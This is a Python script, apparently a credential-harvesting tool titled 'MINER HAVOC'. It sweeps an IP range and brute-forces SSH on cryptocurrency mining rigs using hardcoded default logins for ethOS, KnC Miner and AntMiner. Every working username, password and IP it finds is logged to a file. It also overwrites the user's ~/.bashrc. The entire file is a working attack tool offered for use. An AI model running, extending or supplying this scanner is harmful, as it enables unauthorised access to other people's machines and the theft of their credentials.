#!/usr/bin/python


import threading
import sys
import socket
import time
import paramiko
import random
import os 



if len(sys.argv) < 3:
    print ("""

XXXXXXXXXXXXXXXXXXFEDERAL RESERVE NOTEXXXXXXXXXXXXXXXXXXX
XXX  XX       THE UNITED STATES OF AMERICA        XXX  XX
XXXX XX  -------       ------------               XXXX XX
XXXX XX              /   jJ===-\    \      C7675  XXXX XX
XXXXXX     OOO      /   jJ - -  L    \      ---    XXXXXX
XXXXX     OOOOO     |   JJ  |   X    |       __     XXXXX
XXX    3   OOO      |   JJ ---  X    |      OOOO    3 XXX
XXX                 |   J|\    /|    |     OOOOOO     XXX
XXX     C36799887   |   /  |  |  \   |      OOOO      XXX
XXX                 |  |          |  |       --       XXX
XXX      -------    \ /            \ /                XXX
X  XX                \ ____________ /               X  XX
XX XXX 3_________        --------  ___   _______ 3 XXX XX
XX XXX            ___  MINER HAVOC  i              XXX XX
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

              
              ~> By Souhardya Sardar 
             [+] github.com/Souhardya [+]


""")
    print("Usage: python "+sys.argv[0]+" [Start IP] [End IP] [etherum/misc]")
    

if not os.geteuid()==0:
	sys.exit("\nRun as root or die\n")

os.system("echo -e 'ulimit -s 999999; ulimit -n 999999; ulimit -u 999999\n' > ~/.bashrc")
os.system("ulimit -s 999999; ulimit -n 999999; ulimit -u 999999")
paramiko.util.log_to_file("/dev/null") 
os.system("sysctl -w fs.file-max=999999 >/dev/null")


if sys.argv[3] == 'etherum':
    passwords = [ "ethos:live", "root:live" ] # etherum os default ssh credentials 
if sys.argv[3] == 'misc':
    passwords = [ "root:admin", "admin:admin" ] # KnC Miner and AntMiner default creds etc



def ipRange(start_ip, end_ip):
    start = list(map(int, start_ip.split(".")))
    end = list(map(int, end_ip.split(".")))
    temp = start
    ip_range = []

    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
            if temp[i] == 256:
                temp[i] = 0
                temp[i-1] += 1
        ip_range.append(".".join(map(str, temp)))    

    return ip_range
class sshscanner(threading.Thread): # TAG: 1A
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip)
    global passwords
    def run(self):
        x = 1
        while x != 0:
            try:
                username='root'
                password="0"
                port = 22
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((self.ip, port))
                s.close()
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                dobreak=False
                for passwd in passwords:
                    if ":n/a" in passwd:
                        password=""
                    else:
                        password=passwd.split(":")[1]
                    if "n/a:" in passwd:
                        username=""
                    else:
                        username=passwd.split(":")[0]
                    try:
                        ssh.connect(self.ip, port = port, username=username, password=password, timeout=5)
                        dobreak=True
                        break
                    except:
                        pass
                    if True == dobreak:
                        break
                badserver=True
                stdin, stdout, stderr = ssh.exec_command("echo hellonofucksgiven")
                output = stdout.read()
                if "hellonofucksgiven" in output:
                    os.system("echo -e " +self.ip+ " >> .stats.ips")
                    os.system("echo -e " +username+ ":" +password+ ":" +self.ip+ " >> gathered.log")
                    print("\033[32mGathering -> " +username+ ":" +password+ ":" +self.ip+ "\033[0m")
                    ssh.exec_command("echo hellothere:)")
                else:
		    pass
	
	        time.sleep(3)
                ssh.close()
            except:
                pass
            x = 0
		
ip_range = ipRange("" +sys.argv[1], "" +sys.argv[2])

for ip in ip_range:
    try:                
        t = sshscanner(ip)
        t.start()
    except:
        pass 
